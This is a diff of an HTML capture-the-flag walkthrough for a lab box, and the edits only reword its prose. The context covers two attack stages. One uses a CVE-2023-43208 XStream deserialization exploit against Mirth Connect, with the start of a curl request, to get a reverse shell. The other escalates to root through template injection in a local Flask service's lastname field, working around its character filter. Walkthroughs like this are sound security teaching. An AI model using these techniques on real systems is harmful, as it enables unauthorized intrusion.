@@ -111,7 +111,7 @@ Server: Mirth-Connect/4.4.0</code></pre>
 <section class="wp-stage" id="foothold" data-stage="2">
 <div class="wp-stage-lbl">Stage 2 &middot; Foothold</div>
 <h2 class="wp-stage-title">XStream deserialization to reverse shell as mirth.</h2>
-<div class="wp-stage-body"><p>The public PoC drops a <code>&lt;sorted-set&gt;</code> XML gadget that bounces through a brace-expansion trick to dodge the space-in-pipe rewrite:</p>
+<div class="wp-stage-body"><p>The public PoC uses a <code>&lt;sorted-set&gt;</code> XML gadget and brace expansion to bypass the space-in-pipe rewrite:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · exploit · CVE-2023-43208</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ curl -sk -X POST <span class="hljs-string">&#x27;https://10.129.244.184/api/users&#x27;</span> \
@@ -175,7 +175,7 @@ sedric   [PBKDF2-SHA256 HASH]</code></pre>
 <section class="wp-stage" id="root" data-stage="5">
 <div class="wp-stage-lbl">Stage 5 &middot; Root</div>
 <h2 class="wp-stage-title">Local notifier service — f-string template injection.</h2>
-<div class="wp-stage-body"><p>Enumeration flags a Flask app on <code>127.0.0.1:54321</code> running as root. <code>sedric</code> can read the source:</p>
+<div class="wp-stage-body"><p>Enumeration finds a Flask app running as root on <code>127.0.0.1:54321</code>. <code>sedric</code> can read its source:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · sedric@interpreter</span></div>
 <pre class="wp-term-body"><code class="hljs language-python"><span class="hljs-comment"># /usr/local/bin/notif.py  (abridged)</span>
@@ -187,7 +187,7 @@ template = config[<span class="hljs-string">&#x27;template&#x27;</span>]
 </div>
 
 
-<p>Regex blocks <code>;</code>, spaces, and <code>&lt;&gt;</code>, but allows quotes, parens, braces, <code>/</code>, <code>.</code>, and <code>=</code>. That&#39;s everything we need to smuggle a Python expression into the template.</p>
+<p>The regex blocks <code>;</code>, spaces, and <code>&lt;&gt;</code>, but allows quotes, parens, braces, <code>/</code>, <code>.</code>, and <code>=</code>. That leaves enough characters to put a Python expression in the template.</p>
 <p>The app accepts patient records over XML on <code>/addPatient</code>; the <span class="hl-red">lastname</span> field feeds into the template unchecked. Payload:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · sedric@interpreter · SSTI</span></div>
